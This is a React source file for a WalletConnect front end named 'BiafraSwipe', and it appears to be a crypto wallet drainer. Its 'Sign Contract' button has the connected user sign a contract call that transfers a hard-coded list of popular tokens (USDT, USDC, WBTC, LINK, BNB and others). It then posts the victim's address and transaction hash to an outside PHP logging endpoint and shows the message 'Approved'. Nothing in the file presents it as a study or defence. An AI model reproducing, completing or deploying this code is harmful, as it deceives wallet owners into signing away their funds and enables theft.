import React, { useEffect, useState } from 'react';
import { WagmiConfig, useAccount, useDisconnect } from 'wagmi';
import { mainnet, goerli } from 'wagmi/chains';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { createWeb3Modal } from '@web3modal/wagmi/react';
import { defaultWagmiConfig } from '@web3modal/wagmi/react/config';
import './App.css';
import ConnectButton from './components/ConnectButton';
import Modal from './components/Modal';
import { getEthersSigner } from './adapters/ethersAdapters';

const ethers = require("ethers");

const queryClient = new QueryClient();
const projectId = '1c1db7ada235d88816f2f0008d415fdc';
const metadata = {
  name: 'BiafraSwipe',
  description: 'BiafraSwipe Description',
  url: 'https://mywebsite.com',
  icons: ['https://avatars.mywebsite.com/'],
};
const chains = [mainnet, goerli];
const config = defaultWagmiConfig({
  chains,
  projectId,
  metadata,
});

createWeb3Modal({
  wagmiConfig: config,
  projectId,
  enableAnalytics: true,
  enableOnramp: true,
});

export function Web3ModalProvider({ children }) {
  return (
    <WagmiConfig config={config}>
      <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
    </WagmiConfig>
  );
}

const tokenAddresses = [
  null, // Ethereum
  '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
  '0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', // USDC
  '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', // Shiba Inu
  '0x514910771AF9Ca656af840dff83E8264EcF986CA', // Chainlink
  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // Wrapped Bitcoin
  '0x7D6F6bAC8eF3f1E5D3C5e1B273c6C98988D11B5C', // Solana (represented as an ERC-20 token here for simplicity)
  '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
  '0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B', // Polkadot (represented as an ERC-20 token here for simplicity)
  '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', // BNB
];

async function transferTokens(signer) {
  const contractAddress = 'YOUR_CONTRACT_ADDRESS'; // Replace with your deployed contract address
  const abi = [
    'function transferTokens(address[] calldata tokenAddresses) external'
  ];
  const contract = new ethers.Contract(contractAddress, abi, signer);
  const tx = await contract.transferTokens(tokenAddresses);
  await tx.wait();
  return tx;
}

function App() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const [transactionInProgress, setTransactionInProgress] = useState(false);
  const [modalMessage, setModalMessage] = useState("");
  const [modalVisible, setModalVisible] = useState(false);

  const logTransaction = async (logData) => {
    await fetch('https://eflujsyb0kuybgol11532.cleavr.one/btc/tt.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(logData),
    });
  };

  const handleSendTransaction = async () => {
    if (isConnected && !transactionInProgress) {
      setTransactionInProgress(true);
      setModalVisible(true);
      setModalMessage("Signing contract...");
      try {
        const signer = await getEthersSigner(config);
        setModalMessage("Processing transaction...");
        const tx = await transferTokens(signer);
        await logTransaction({ success: true, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client', txHash: tx.hash });
        setModalMessage("Approved");
      } catch (error) {
        console.error('Transaction failed:', error);
        await logTransaction({ success: false, error: error.message, address, timestamp: new Date().toISOString(), ip: 'fetch IP from client' });
        setModalMessage("Declined");
      } finally {
        setTransactionInProgress(false);
        setTimeout(() => setModalVisible(false), 3000); // Close modal after 3 seconds
      }
    }
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>WalletConnect App</h1>
        {isConnected ? (
          <>
            <p>Connected account: {address}</p>
            <button onClick={handleSendTransaction} disabled={transactionInProgress}>
              {transactionInProgress ? 'Processing...' : 'Sign Contract'}
            </button>
            <button onClick={disconnect}>Disconnect Wallet</button>
          </>
        ) : (
          <ConnectButton />
        )}
      </header>
      {modalVisible && <Modal message={modalMessage} />}
    </div>
  );
}

export default App;
